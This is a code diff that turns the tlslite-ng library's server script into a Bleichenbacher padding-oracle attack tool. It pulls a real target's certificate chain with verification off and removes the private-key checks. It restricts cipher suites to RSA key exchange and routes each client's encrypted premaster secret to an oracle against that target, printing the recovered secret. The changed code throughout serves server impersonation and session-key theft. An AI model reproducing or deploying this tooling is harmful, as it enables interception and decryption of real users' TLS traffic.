@@ -1,0 +1,421 @@
+diff --git a/docs/make.bat b/docs/make.bat
+old mode 100644
+new mode 100755
+diff --git a/requirements.txt b/requirements.txt
+index 5d32b92..1a995d1 100644
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -1 +1,2 @@
+ ecdsa>=0.18.0b1
++pycryptodome
+diff --git a/scripts/tls.py b/scripts/tls.py
+index 658327e..03f6263 100755
+--- a/scripts/tls.py
++++ b/scripts/tls.py
+@@ -14,6 +14,8 @@ import socket
+ import struct
+ import getopt
+ import binascii
++import ssl
++import threading
+ try:
+     import httplib
+     from SocketServer import *
+@@ -40,6 +42,7 @@ from tlslite.utils.dns_utils import is_valid_hostname
+ from tlslite.utils.cryptomath import getRandomBytes
+ from tlslite.constants import KeyUpdateMessageType
+ from tlslite.utils.compression import compression_algo_impls
++import reversebleichenbacher.bleichenbachertls
+ 
+ try:
+     from tack.structures.Tack import Tack
+@@ -109,8 +112,8 @@ def printUsage(s=None):
+     [-c CERT] [-k KEY] [-t TACK] [-v VERIFIERDB] [-d DIR] [-l LABEL] [-L LENGTH]
+     [--reqcert] [--param DHFILE] [--psk PSK] [--psk-ident IDENTITY]
+     [--psk-sha384] [--ssl3] [--max-ver VER] [--tickets COUNT] [--cipherlist]
+-    [--request-pha] [--require-pha] [--echo] [--groups GROUPS]
+-    HOST:PORT
++    [--request-pha] [--require-pha] [--echo] [--groups GROUPS] [--bleichenbacher target:PORT]
++    [--parallel] [--test-oracle] HOST:PORT
+ 
+   client
+     [-c CERT] [-k KEY] [-u USER] [-p PASS] [-l LABEL] [-L LENGTH] [-a ALPN]
+@@ -142,6 +145,9 @@ def printUsage(s=None):
+   CERT, KEY - the file with key and certificates that will be used by client or
+         server. The server can accept multiple pairs of `-c` and `-k` options
+         to configure different certificates (like RSA and ECDSA)
++  --bleichenbacher - target server for Bleichenbacher's attack
++  --parallel - enable parallelization for the Bleichenbacher attack
++  --test-oracle - run verification test against known plaintext (for debugging)
+ 
+ """)
+     sys.exit(-1)
+@@ -200,6 +206,11 @@ def handleArgs(argv, argString, flagsList=[]):
+     require_pha = False
+     echo = False
+     groups = None
++    bleichenbacher = None
++    bleichenbacher_ip = None
++    bleichenbacher_port = None
++    parallel = False
++    test_oracle = False
+ 
+     for opt, arg in opts:
+         if opt == "-k":
+@@ -281,6 +292,32 @@ def handleArgs(argv, argString, flagsList=[]):
+             require_pha = True
+         elif opt == "--echo":
+             echo = True
++        elif opt == "--bleichenbacher":
++            cert_chain = X509CertChain()
++            arg = arg.split(":")
++            bleichenbacher_ip = socket.gethostbyname(arg[0])
++            bleichenbacher_port = 443 if len(arg) == 1 else int(arg[1])
++            # ssl.get_server_certificate() only returns the leaf cert,
++            # so we do a manual connection to get the full chain.
++            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
++            ctx.check_hostname = False
++            ctx.verify_mode = ssl.CERT_NONE
++            with socket.create_connection((bleichenbacher_ip, bleichenbacher_port)) as raw_sock:
++                with ctx.wrap_socket(raw_sock, server_hostname=arg[0]) as ssock:
++                    # get_unverified_chain() works even with CERT_NONE
++                    # and returns the full chain as sent by the server
++                    der_certs = ssock._sslobj.get_unverified_chain()
++            pem_list = ""
++            for cert in der_certs:
++                pem_list += cert.public_bytes()
++            cert_chain.parsePemList(pem_list)
++            # Fix TLS version
++            max_ver = (3,3)
++            ciphers = ['aes128']
++        elif opt == "--parallel":
++            parallel = True
++        elif opt == "--test-oracle":
++            test_oracle = True
+         else:
+             assert(False)
+ 
+@@ -351,6 +388,18 @@ def handleArgs(argv, argString, flagsList=[]):
+         retList.append(echo)
+     if "groups=" in flagsList:
+         retList.append(groups)
++    
++    # Create BleichenbacherAttack instance before adding to retList
++    if bleichenbacher_ip is not None and bleichenbacher_port is not None:
++        bleichenbacher = reversebleichenbacher.bleichenbachertls.bleichenbacher_attack_tls(bleichenbacher_ip, bleichenbacher_port, quiet=False, benchmark=0, early_abort=False, test_oracle=test_oracle, parallel=parallel)
++    
++    if "bleichenbacher=" in flagsList:
++        retList.append(bleichenbacher)
++    if "parallel" in flagsList:
++        retList.append(parallel)
++    if "test-oracle" in flagsList:
++        retList.append(test_oracle)
++    
+     return retList
+ 
+ 
+@@ -556,16 +605,16 @@ def serverCmd(argv):
+             directory, reqCert,
+             expLabel, expLength, dhparam, psk, psk_ident, psk_hash, ssl3,
+             max_ver, tickets, cipherlist, request_pha, require_pha, echo,
+-            groups) = \
++            groups, bleichenbacher, parallel, test_oracle) = \
+         handleArgs(argv, "kctbvdlL",
+                    ["reqcert", "param=", "psk=",
+                     "psk-ident=", "psk-sha384", "ssl3", "max-ver=",
+                     "tickets=", "cipherlist=", "request-pha", "require-pha",
+-                    "echo", "groups="])
++                    "echo", "groups=", "bleichenbacher=", "parallel", "test-oracle"])
+ 
+ 
+-    if (cert_chain and not privateKey) or (not cert_chain and privateKey):
+-        raise SyntaxError("Must specify CERT and KEY together")
++    # if (cert_chain and not privateKey) or (not cert_chain and privateKey):
++    #     raise SyntaxError("Must specify CERT and KEY together")
+     if tacks and not cert_chain:
+         raise SyntaxError("Must specify CERT with Tacks")
+ 
+@@ -628,12 +677,18 @@ def serverCmd(argv):
+                     break
+                 self.request.send(data)
+ 
++    lock = threading.Semaphore()
++    # thread = None
++    lock.acquire()
++
+     class MySimpleHTTPHandler(SimpleHTTPRequestHandler, object):
+         """Buffer the header and body of HTTP message."""
+         wbufsize = -1
+ 
+         def do_GET(self):
+             """Simple override to send KeyUpdate to client."""
++            # thread = threading.current_thread()
++            lock.release() # notify main thread
+             if self.path.startswith('/keyupdate'):
+                 for i in self.connection.send_keyupdate_request(
+                         KeyUpdateMessageType.update_requested):
+@@ -666,6 +721,10 @@ def serverCmd(argv):
+                     return
+             return super(MySimpleHTTPHandler, self).do_GET()
+ 
++        def do_POST(self):
++            """Handle POST requests the same as GET requests."""
++            return self.do_GET()
++
+     if echo:
+         mixin = TCPServer
+         handler = MySimpleEchoHandler
+@@ -692,6 +751,8 @@ def serverCmd(argv):
+                 connection.client_cert_required = require_pha
+                 connection.handshakeServer(certChain=cert_chain,
+                                               privateKey=privateKey,
++                                              bleichenbacher=bleichenbacher,
++                                              parallel=parallel,
+                                               verifierDB=verifierDB,
+                                               tacks=tacks,
+                                               activationFlags=activationFlags,
+@@ -742,8 +803,9 @@ def serverCmd(argv):
+             return True
+ 
+     server = MyServer(address, handler)
+-    server.serve_forever()
+-
++    server.handle_request() # server.serve_forever()
++    lock.acquire()
++    # thread.join(timeout=2)
+ 
+ if __name__ == '__main__':
+     if len(sys.argv) < 2:
+diff --git a/scripts/tlsdb.py b/scripts/tlsdb.py
+old mode 100755
+new mode 100644
+diff --git a/setup.py b/setup.py
+old mode 100755
+new mode 100644
+index 72f6a28..79ccfcc
+--- a/setup.py
++++ b/setup.py
+@@ -22,7 +22,9 @@ setup(name="tlslite-ng",
+       packages=["tlslite", "tlslite.utils", "tlslite.integration"],
+       package_data={
+                     'package1': ['LICENSE', 'README.md']},
+-      install_requires=['ecdsa>=0.18.0b1'],
++      install_requires=['ecdsa>=0.18.0b1', 'gmpy2>=2.2.1','cryptography==44.0.3', 'pyshark==0.6',
++'tqdm==4.67.1', 'pycryptodome>=3.22.0', 'reversebleichenbacher'
++],
+       obsoletes=["tlslite"],
+       python_requires=">=2.6, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, !=3.5.*, !=3.6.*",
+       classifiers=[
+diff --git a/tests/httpsclient.py b/tests/httpsclient.py
+old mode 100755
+new mode 100644
+diff --git a/tests/httpsserver.sh b/tests/httpsserver.sh
+old mode 100755
+new mode 100644
+diff --git a/tests/tlstest.py b/tests/tlstest.py
+old mode 100755
+new mode 100644
+diff --git a/tlslite/constants.py b/tlslite/constants.py
+index 3395c4b..8cca020 100644
+--- a/tlslite/constants.py
++++ b/tlslite/constants.py
+@@ -1019,28 +1019,28 @@ class CipherSuite:
+ 
+     #: AES-128 CBC ciphers
+     aes128Suites = []
+-    aes128Suites.append(TLS_SRP_SHA_WITH_AES_128_CBC_SHA)
+-    aes128Suites.append(TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_SRP_SHA_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA)
+     aes128Suites.append(TLS_RSA_WITH_AES_128_CBC_SHA)
+-    aes128Suites.append(TLS_DHE_RSA_WITH_AES_128_CBC_SHA)
+-    aes128Suites.append(TLS_DH_ANON_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_DHE_RSA_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_DH_ANON_WITH_AES_128_CBC_SHA)
+     aes128Suites.append(TLS_RSA_WITH_AES_128_CBC_SHA256)
+-    aes128Suites.append(TLS_DHE_RSA_WITH_AES_128_CBC_SHA256)
+-    aes128Suites.append(TLS_DH_ANON_WITH_AES_128_CBC_SHA256)
+-    aes128Suites.append(TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256)
+-    aes128Suites.append(TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA)
+-    aes128Suites.append(TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256)  # unsupported
+-    aes128Suites.append(TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA)  # unsupported
+-    aes128Suites.append(TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256)  # unsupported
+-    aes128Suites.append(TLS_ECDH_RSA_WITH_AES_128_CBC_SHA)  # unsupported
+-    aes128Suites.append(TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA)
+-    aes128Suites.append(TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256)
+-    aes128Suites.append(TLS_ECDH_ANON_WITH_AES_128_CBC_SHA)
+-    aes128Suites.append(TLS_DH_DSS_WITH_AES_128_CBC_SHA)    # unsupported
+-    aes128Suites.append(TLS_DHE_DSS_WITH_AES_128_CBC_SHA)   # unsupported
+-    aes128Suites.append(TLS_DH_DSS_WITH_AES_128_CBC_SHA256) # unsupported
+-    aes128Suites.append(TLS_DHE_DSS_WITH_AES_128_CBC_SHA256)    # unsupported
+-    aes128Suites.append(TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA)   # unsupported
++    # aes128Suites.append(TLS_DHE_RSA_WITH_AES_128_CBC_SHA256)
++    # aes128Suites.append(TLS_DH_ANON_WITH_AES_128_CBC_SHA256)
++    # aes128Suites.append(TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256)
++    # aes128Suites.append(TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256)  # unsupported
++    # aes128Suites.append(TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA)  # unsupported
++    # aes128Suites.append(TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256)  # unsupported
++    # aes128Suites.append(TLS_ECDH_RSA_WITH_AES_128_CBC_SHA)  # unsupported
++    # aes128Suites.append(TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256)
++    # aes128Suites.append(TLS_ECDH_ANON_WITH_AES_128_CBC_SHA)
++    # aes128Suites.append(TLS_DH_DSS_WITH_AES_128_CBC_SHA)    # unsupported
++    # aes128Suites.append(TLS_DHE_DSS_WITH_AES_128_CBC_SHA)   # unsupported
++    # aes128Suites.append(TLS_DH_DSS_WITH_AES_128_CBC_SHA256) # unsupported
++    # aes128Suites.append(TLS_DHE_DSS_WITH_AES_128_CBC_SHA256)    # unsupported
++    # aes128Suites.append(TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA)   # unsupported
+ 
+     #: AES-256 CBC ciphers
+     aes256Suites = []
+diff --git a/tlslite/keyexchange.py b/tlslite/keyexchange.py
+index 5bade6f..37edb08 100644
+--- a/tlslite/keyexchange.py
++++ b/tlslite/keyexchange.py
+@@ -5,6 +5,7 @@
+ """Handling of cryptographic operations for key exchange"""
+ 
+ import ecdsa
++from Crypto.Util.number import long_to_bytes, bytes_to_long
+ from .mathtls import goodGroupParameters, makeK, makeU, makeX, \
+         paramStrength, RFC7919_GROUPS, calc_key
+ from .errors import TLSInsufficientSecurity, TLSUnknownPSKIdentity, \
+@@ -23,6 +24,7 @@ from .utils.x25519 import x25519, x448, X25519_G, X448_G, X25519_ORDER_SIZE, \
+         X448_ORDER_SIZE
+ from .utils.compat import int_types, ML_KEM_AVAILABLE
+ from .utils.codec import DecodeError
++from tlslite.messages import AlertDescription, TLSAlert
+ 
+ if ML_KEM_AVAILABLE:
+     from kyber_py.ml_kem import ML_KEM_768, ML_KEM_1024
+@@ -35,12 +37,16 @@ class KeyExchange(object):
+     NOT stable, will get moved from this file
+     """
+ 
+-    def __init__(self, cipherSuite, clientHello, serverHello, privateKey=None):
++    def __init__(self, cipherSuite, clientHello, serverHello, privateKey=None, bleichenbacher=None):
+         """Initialize KeyExchange. privateKey is the signing private key"""
+         self.cipherSuite = cipherSuite
+         self.clientHello = clientHello
+         self.serverHello = serverHello
+         self.privateKey = privateKey
++        self.bleichenbacher = bleichenbacher
++        if privateKey is None and bleichenbacher is None:
++            raise TLSInternalError("Key exchange requires private key or "
++                                   "bleichenbacher object")
+ 
+     def makeServerKeyExchange(self, sigHash=None):
+         """
+@@ -517,9 +523,10 @@ class RSAKeyExchange(KeyExchange):
+     NOT stable API, do NOT use
+     """
+ 
+-    def __init__(self, cipherSuite, clientHello, serverHello, privateKey):
++    def __init__(self, cipherSuite, clientHello, serverHello, privateKey, bleichenbacher=None, parallel=False):
+         super(RSAKeyExchange, self).__init__(cipherSuite, clientHello,
+-                                             serverHello, privateKey)
++                                             serverHello, privateKey, bleichenbacher)
++        self.parallel = parallel
+         self.encPremasterSecret = None
+ 
+     def makeServerKeyExchange(self, sigHash=None):
+@@ -528,8 +535,27 @@ class RSAKeyExchange(KeyExchange):
+ 
+     def processClientKeyExchange(self, clientKeyExchange):
+         """Decrypt client key exchange, return premaster secret"""
+-        premasterSecret = self.privateKey.decrypt(\
+-            clientKeyExchange.encryptedPreMasterSecret)
++
++        # OVERRIDE
++        if self.privateKey is not None:
++            premasterSecret = self.privateKey.decrypt(\
++                clientKeyExchange.encryptedPreMasterSecret)
++        else:
++            c = bytes_to_long(clientKeyExchange.encryptedPreMasterSecret)
++            # decrypt the message using the bleichenbacher object
++            
++            try:
++                m = self.bleichenbacher.decrypt(c)
++                msg = long_to_bytes(m)
++                print(msg)
++                premasterSecret = bytearray(b'\x03\x03' + msg.split(b'\x03\x03')[-1])
++                print("N=", self.bleichenbacher.rsa.N)
++                print("e=", self.bleichenbacher.rsa.e)
++                print("encryptedPreMasterSecret: ", clientKeyExchange.encryptedPreMasterSecret.hex())
++                print("premasterSecret: ", premasterSecret.hex())
++            except:
++                raise TLSAlert(AlertDescription.handshake_failure)
++                premasterSecret = None
+ 
+         # On decryption failure randomize premaster secret to avoid
+         # Bleichenbacher's "million message" attack
+diff --git a/tlslite/tlsconnection.py b/tlslite/tlsconnection.py
+index c4e6502..e550890 100644
+--- a/tlslite/tlsconnection.py
++++ b/tlslite/tlsconnection.py
+@@ -2126,7 +2126,7 @@ class TLSConnection(TLSRecordLayer):
+                         sessionCache=None, settings=None, checker=None,
+                         reqCAs = None,
+                         tacks=None, activationFlags=0,
+-                        nextProtos=None, anon=False, alpn=None, sni=None):
++                        nextProtos=None, anon=False, alpn=None, sni=None, bleichenbacher=None, parallel=False):
+         """Perform a handshake in the role of server.
+ 
+         This function performs an SSL or TLS handshake.  Depending on
+@@ -2218,7 +2218,7 @@ class TLSConnection(TLSRecordLayer):
+                 certChain, privateKey, reqCert, sessionCache, settings,
+                 checker, reqCAs,
+                 tacks=tacks, activationFlags=activationFlags,
+-                nextProtos=nextProtos, anon=anon, alpn=alpn, sni=sni):
++                nextProtos=nextProtos, anon=anon, alpn=alpn, sni=sni, bleichenbacher=bleichenbacher, parallel=parallel):
+             pass
+ 
+ 
+@@ -2227,7 +2227,8 @@ class TLSConnection(TLSRecordLayer):
+                              sessionCache=None, settings=None, checker=None,
+                              reqCAs=None,
+                              tacks=None, activationFlags=0,
+-                             nextProtos=None, anon=False, alpn=None, sni=None
++                             nextProtos=None, anon=False, alpn=None, sni=None,
++                             bleichenbacher=None, parallel=False
+                              ):
+         """Start a server handshake operation on the TLS connection.
+ 
+@@ -2246,7 +2247,7 @@ class TLSConnection(TLSRecordLayer):
+             sessionCache=sessionCache, settings=settings,
+             reqCAs=reqCAs,
+             tacks=tacks, activationFlags=activationFlags,
+-            nextProtos=nextProtos, anon=anon, alpn=alpn, sni=sni)
++            nextProtos=nextProtos, anon=anon, alpn=alpn, sni=sni, bleichenbacher=bleichenbacher, parallel=parallel)
+         for result in self._handshakeWrapperAsync(handshaker, checker):
+             yield result
+ 
+@@ -2255,7 +2256,7 @@ class TLSConnection(TLSRecordLayer):
+                                     cert_chain, privateKey, reqCert,
+                                     sessionCache, settings, reqCAs, tacks,
+                                     activationFlags, nextProtos, anon, alpn,
+-                                    sni):
++                                    sni, bleichenbacher, parallel=False):
+ 
+         self._handshakeStart(client=False)
+ 
+@@ -2266,8 +2267,8 @@ class TLSConnection(TLSRecordLayer):
+         if (not verifierDB) and (not cert_chain) and not anon and \
+                 not settings.pskConfigs and not settings.virtual_hosts:
+             raise ValueError("Caller passed no authentication credentials")
+-        if cert_chain and not privateKey:
+-            raise ValueError("Caller passed a cert_chain but no privateKey")
++        # if cert_chain and not privateKey:
++        #     raise ValueError("Caller passed a cert_chain but no privateKey")
+         if privateKey and not cert_chain:
+             raise ValueError("Caller passed a privateKey but no cert_chain")
+         if reqCAs and not reqCert:
+@@ -2484,7 +2485,7 @@ class TLSConnection(TLSRecordLayer):
+                 keyExchange = RSAKeyExchange(cipherSuite,
+                                              clientHello,
+                                              serverHello,
+-                                             privateKey)
++                                             privateKey, bleichenbacher=bleichenbacher, parallel=parallel)
+             elif cipherSuite in CipherSuite.dheCertSuites or \
+                     cipherSuite in CipherSuite.dheDsaSuites:
+                 dhGroups = self._groupNamesToList(settings)
